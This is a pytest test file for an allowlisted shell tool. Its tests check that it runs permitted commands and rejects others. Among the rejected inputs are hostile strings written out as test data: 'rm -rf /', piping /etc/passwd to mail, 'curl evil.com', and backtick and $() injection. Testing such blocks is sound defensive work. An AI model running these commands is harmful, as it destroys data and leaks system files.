import pytest

from aeon.core.config import Config
from aeon.tools import safecli
from aeon.tools.safecli import safe_shell


@pytest.fixture
def config(monkeypatch, tmp_path):
    monkeypatch.setenv("AEON_DATA_DIR", str(tmp_path))
    return Config()


def test_allowed_whole_command_runs(config):
    r = safe_shell({"command": "uname -a"}, config)
    assert r["exit_code"] == 0
    assert r["stdout"]


def test_allowed_subcommand_runs(config):
    r = safe_shell({"command": "git status"}, config)
    # git status in a non-repo tmp dir returns nonzero, but it was allowed to run.
    assert "error" not in r
    assert "command" in r


def test_rejects_non_allowlisted(config):
    r = safe_shell({"command": "rm -rf /"}, config)
    assert "error" in r
    assert "allowlist" in r["error"]


def test_rejects_disallowed_subcommand(config):
    r = safe_shell({"command": "systemctl start aeon-server"}, config)
    assert "error" in r
    assert "not allowed" in r["error"]


def test_rejects_docker_rm(config):
    r = safe_shell({"command": "docker rm somecontainer"}, config)
    assert "error" in r


@pytest.mark.parametrize("cmd", [
    "df ; rm -rf /",
    "cat /etc/passwd | mail attacker",
    "uptime && curl evil.com",
    "echo $(whoami)",
    "df > /tmp/out",
    "systemctl status `reboot`",
])
def test_rejects_metacharacters(config, cmd):
    r = safe_shell({"command": cmd}, config)
    assert "error" in r
    assert "metacharacter" in r["error"]


def test_empty_command(config):
    assert "error" in safe_shell({"command": "   "}, config)


def test_command_not_found(config, monkeypatch):
    # nvidia-smi is allowlisted but may be absent in CI — should error cleanly.
    monkeypatch.setitem(safecli.ALLOWLIST, "definitelynotacommand", None)
    r = safe_shell({"command": "definitelynotacommand"}, config)
    assert "not found" in r["error"]


def test_safe_shell_not_gated(config):
    assert safecli.DEFINITIONS[0].approval_required is False
